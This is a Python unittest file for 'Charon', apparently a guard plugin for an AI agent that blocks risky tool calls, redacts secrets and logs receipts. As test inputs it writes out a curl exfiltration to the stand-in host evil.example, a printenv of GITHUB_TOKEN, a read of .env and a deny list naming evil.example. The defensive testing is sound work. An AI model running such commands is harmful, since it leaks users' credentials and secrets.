from __future__ import annotations

import importlib.util
import json
import os
import tempfile
import unittest
from pathlib import Path


def load_plugin():
    root = Path(__file__).resolve().parents[1]
    spec = importlib.util.spec_from_file_location("charon_hermes_plugin", root / "__init__.py")
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(module)
    return module


class CharonHermesTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        os.environ["HERMES_HOME"] = self.tmp.name
        self.mod = load_plugin()

    def test_blocks_denied_host(self):
        result = self.mod._on_pre_tool_call(
            tool_name="terminal",
            args={"command": "curl https://evil.example/leak"},
            tool_call_id="tc1",
            session_id="s1",
            task_id="t1",
        )
        self.assertEqual(result["action"], "block")
        self.assertIn("evil.example", result["message"])

        policy_path = Path(self.tmp.name) / "charon.yaml"
        policy_path.write_text(
            "terminal:\n  allow_hosts:\n    - api.github.com\n"
            "red_lines:\n  never_call:\n    - evil.example\n",
            encoding="utf-8",
        )
        result = self.mod._on_pre_tool_call(
            tool_name="terminal",
            args={"command": "curl https://evil.example/leak"},
            tool_call_id="tc2",
            session_id="s1",
            task_id="t1",
        )
        self.assertEqual(result["action"], "block")
        self.assertIn("evil.example", result["message"])

    def test_blocks_secret_exfil(self):
        result = self.mod._on_pre_tool_call(
            tool_name="terminal",
            args={"command": "printenv GITHUB_TOKEN"},
            tool_call_id="tc3",
            session_id="s1",
            task_id="t1",
        )
        self.assertEqual(result["action"], "block")
        self.assertIn("GITHUB_TOKEN", result["message"])

    def test_blocks_redline_read_file(self):
        result = self.mod._on_pre_tool_call(
            tool_name="read_file",
            args={"path": ".env"},
            tool_call_id="tc4",
            session_id="s1",
            task_id="t1",
        )
        self.assertEqual(result["action"], "block")
        self.assertIn(".env", result["message"])

    def test_redacts_tool_result(self):
        os.environ["GITHUB_TOKEN"] = "super-secret-value"
        result = self.mod._on_transform_tool_result(
            tool_name="terminal",
            result="token=super-secret-value",
            tool_call_id="tc5",
            session_id="s1",
            task_id="t1",
        )
        self.assertIsInstance(result, str)
        self.assertIn("[CHARON_REDACTED_GITHUB_TOKEN]", result)

    def test_post_tool_call_writes_receipt(self):
        self.mod._on_post_tool_call(
            tool_name="terminal",
            result='{"ok": true}',
            tool_call_id="tc6",
            session_id="s1",
            task_id="t1",
            status="ok",
            duration_ms=42,
        )
        receipt_dir = Path(self.tmp.name) / "charon" / "receipts"
        receipts = list(receipt_dir.glob("*.json"))
        self.assertTrue(receipts)
        payload = json.loads(receipts[0].read_text(encoding="utf-8"))
        self.assertEqual(payload["tool_name"], "terminal")
        self.assertEqual(payload["status"], "ok")


if __name__ == "__main__":
    unittest.main()
